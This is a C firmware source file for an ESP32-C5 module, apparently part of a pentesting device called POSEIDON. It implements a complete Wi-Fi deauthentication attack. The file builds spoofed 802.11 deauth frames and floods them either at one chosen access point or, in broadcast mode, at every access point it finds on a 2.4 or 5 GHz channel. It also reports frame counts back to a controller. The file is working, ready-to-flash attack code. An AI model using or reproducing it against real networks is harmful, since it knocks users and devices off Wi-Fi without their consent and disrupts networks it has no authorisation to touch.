/*
 * wifi_attacker.c — 802.11 deauth on the ESP32-C5.
 *
 * The C5 talks Wi-Fi 6 on BOTH 2.4 GHz AND 5 GHz, which means it can
 * inject management frames on 5 GHz channels — something the S3 / C6
 * side of POSEIDON physically cannot do. This is the headline C5
 * pentesting feature.
 *
 * Two modes:
 *   - Targeted: deauth one BSSID for `duration_ms`.
 *   - Broadcast: hop nothing, sit on `channel`, blast deauths to
 *     every BSSID seen on that channel during the window.
 *
 * Streams a RESP_STATUS frame periodically so the S3 UI can show
 * "frames sent" without us replying to every burst.
 */
#include "proto.h"
#include "led_fx.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>
#include <stdlib.h>

static const char *TAG = "attacker";

struct deauth_arg_t {
    uint8_t  requester[6];
    uint16_t seq;
    uint8_t  bssid[6];
    uint8_t  channel;
    uint8_t  bcast_all;
    uint16_t duration_ms;
};

/* Standard 802.11 deauth — reason 7 (class-3 frame from non-assoc STA). */
static uint8_t s_frame[26] = {
    0xC0, 0x00, 0x00, 0x00,
    0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,           /* dst = broadcast */
    0,0,0,0,0,0,                              /* src = AP */
    0,0,0,0,0,0,                              /* bssid = AP */
    0x00, 0x00,
    0x07, 0x00,                               /* reason code */
};

/* attack_ch is the channel we're currently attacking on (e.g. 157 for
 * 5 GHz). POSEIDON (ESP32-S3) physically cannot tune to 5 GHz channels,
 * so it stays pinned to ch 1. If we send RESP_STATUS while on attack_ch,
 * POSEIDON never hears it. So hop to ch 1 briefly, send, hop back.
 * ~2-5ms per call, negligible against a 250 ms status cadence. */
static void send_status(const uint8_t *requester, uint16_t seq,
                        uint32_t frames_sent, uint8_t attack_ch)
{
    posei_msg_t m;
    proto_init_msg(&m, POSEI_TYPE_RESP_STATUS);
    m.seq = seq;
    memcpy(m.payload, &frames_sent, 4);
    m.payload[4] = attack_ch;
    m.payload_len = 5;

    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    proto_send_to(requester, &m);
    /* Tiny wait so the TX actually goes out before we hop back. */
    vTaskDelay(pdMS_TO_TICKS(2));
    esp_wifi_set_channel(attack_ch, WIFI_SECOND_CHAN_NONE);
}

static void deauth_targeted_task(void *arg)
{
    struct deauth_arg_t *r = (struct deauth_arg_t *)arg;
    ESP_LOGI(TAG, "deauth ch=%u bssid=%02x:%02x:%02x:%02x:%02x:%02x dur=%ums",
             r->channel,
             r->bssid[0], r->bssid[1], r->bssid[2],
             r->bssid[3], r->bssid[4], r->bssid[5], r->duration_ms);

    /* Build the spoofed-from-AP, broadcast-to-everyone frame. */
    memcpy(s_frame + 10, r->bssid, 6);
    memcpy(s_frame + 16, r->bssid, 6);

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(r->channel, WIFI_SECOND_CHAN_NONE);

    uint32_t end   = xTaskGetTickCount() + pdMS_TO_TICKS(r->duration_ms);
    uint32_t sent  = 0;
    uint32_t last_status = 0;

    while (xTaskGetTickCount() < end) {
        esp_wifi_80211_tx(WIFI_IF_STA, s_frame, sizeof(s_frame), false);
        sent++;
        if (xTaskGetTickCount() - last_status > pdMS_TO_TICKS(250)) {
            send_status(r->requester, r->seq, sent, r->channel);
            last_status = xTaskGetTickCount();
        }
        vTaskDelay(pdMS_TO_TICKS(2));
    }
    /* Final status. */
    send_status(r->requester, r->seq, sent, r->channel);

    esp_wifi_set_promiscuous(false);
    /* Restore ch 1 so subsequent HELLOs / cmd-acks reach POSEIDON. */
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    led_fx_set(LED_MODE_IDLE);
    free(r);
    vTaskDelete(NULL);
}

/* Broadcast mode: scan briefly to enumerate APs on `channel`, then
 * rotate through them blasting deauths. */
struct ap_t { uint8_t bssid[6]; };
static struct ap_t s_aps[16];
static int         s_ap_n;

static void deauth_bcast_task(void *arg)
{
    struct deauth_arg_t *r = (struct deauth_arg_t *)arg;
    ESP_LOGI(TAG, "deauth-all ch=%u dur=%ums", r->channel, r->duration_ms);

    /* Quick scan locked to the requested channel. */
    wifi_scan_config_t cfg = {
        .ssid = NULL, .bssid = NULL,
        .channel = r->channel,
        .show_hidden = true,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time = { .active = { .min = 80, .max = 150 } },
    };
    esp_wifi_scan_start(&cfg, true);
    uint16_t ap_count = 0;
    esp_wifi_scan_get_ap_num(&ap_count);
    s_ap_n = 0;
    if (ap_count > 0) {
        wifi_ap_record_t *recs = malloc(sizeof(wifi_ap_record_t) * ap_count);
        if (recs) {
            esp_wifi_scan_get_ap_records(&ap_count, recs);
            for (int i = 0; i < ap_count && s_ap_n < 16; ++i) {
                memcpy(s_aps[s_ap_n++].bssid, recs[i].bssid, 6);
            }
            free(recs);
        }
    }

    if (s_ap_n == 0) {
        ESP_LOGW(TAG, "no APs on channel %u", r->channel);
        send_status(r->requester, r->seq, 0, r->channel);
        free(r);
        vTaskDelete(NULL);
        return;
    }

    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(r->channel, WIFI_SECOND_CHAN_NONE);

    uint32_t end = xTaskGetTickCount() + pdMS_TO_TICKS(r->duration_ms);
    uint32_t sent = 0;
    uint32_t last_status = 0;
    int cur = 0;

    while (xTaskGetTickCount() < end) {
        const struct ap_t *a = &s_aps[cur % s_ap_n];
        memcpy(s_frame + 10, a->bssid, 6);
        memcpy(s_frame + 16, a->bssid, 6);
        for (int i = 0; i < 16 && xTaskGetTickCount() < end; ++i) {
            esp_wifi_80211_tx(WIFI_IF_STA, s_frame, sizeof(s_frame), false);
            sent++;
            vTaskDelay(pdMS_TO_TICKS(3));
        }
        cur++;
        if (xTaskGetTickCount() - last_status > pdMS_TO_TICKS(250)) {
            send_status(r->requester, r->seq, sent, r->channel);
            last_status = xTaskGetTickCount();
        }
    }
    send_status(r->requester, r->seq, sent, r->channel);

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    led_fx_set(LED_MODE_IDLE);
    free(r);
    vTaskDelete(NULL);
}

void wifi_attacker_deauth(const uint8_t *requester,
                          const posei_deauth_req_t *req,
                          uint16_t seq)
{
    struct deauth_arg_t *r = malloc(sizeof(*r));
    if (!r) return;
    memcpy(r->requester, requester, 6);
    memcpy(r->bssid, req->bssid, 6);
    r->seq         = seq;
    r->channel     = req->channel;
    r->bcast_all   = req->bcast_all;
    r->duration_ms = req->duration_ms ? req->duration_ms : 5000;

    if (r->bcast_all) {
        xTaskCreate(deauth_bcast_task, "dauth_b", 4096, r, 4, NULL);
    } else {
        xTaskCreate(deauth_targeted_task, "dauth_t", 4096, r, 4, NULL);
    }
}
